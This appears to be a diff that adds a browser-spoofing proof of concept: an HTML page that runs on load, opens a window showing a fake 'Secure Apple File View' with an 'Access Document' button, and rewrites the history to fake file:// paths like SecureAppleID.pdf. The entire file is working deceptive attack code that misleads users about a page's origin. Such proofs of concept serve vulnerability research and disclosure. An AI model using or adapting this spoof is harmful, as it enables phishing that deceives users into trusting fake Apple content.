@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>file:// Anti-Back Deception</title>
+  <script>
+    function launchDeceptiveChain() {
+      // Simulate a legitimate file open
+      const intermediate = window.open('about:blank', '_blank');
+      const spoofHTML = `
+        <html>
+          <body style='margin:0;font-family:-apple-system;background:#fff;'>
+            <div style='padding:20px;'>
+              <h2>Secure Apple File View</h2>
+              <p>This file is protected by Apple.</p>
+              <button style='padding:10px;background:#007aff;color:white;width:100%;'>Access Document</button>
+            </div>
+            <script>
+              history.pushState({}, '', 'file:///Users/you/Documents/SecureAppleID.pdf');
+              history.replaceState({}, '', 'file:///Users/you/Documents/SpoofedFile.html');
+            <\/script>
+          </body>
+        </html>
+      `;
+
+      const blob = new Blob([spoofHTML], { type: 'text/html' });
+      const blobURL = URL.createObjectURL(blob);
+      setTimeout(() => {
+        if (intermediate) intermediate.location.href = blobURL;
+      }, 100);
+    }
+
+    window.onload = launchDeceptiveChain;
+  </script>
+</head>
+<body style="margin:0">
+</body>
+</html>
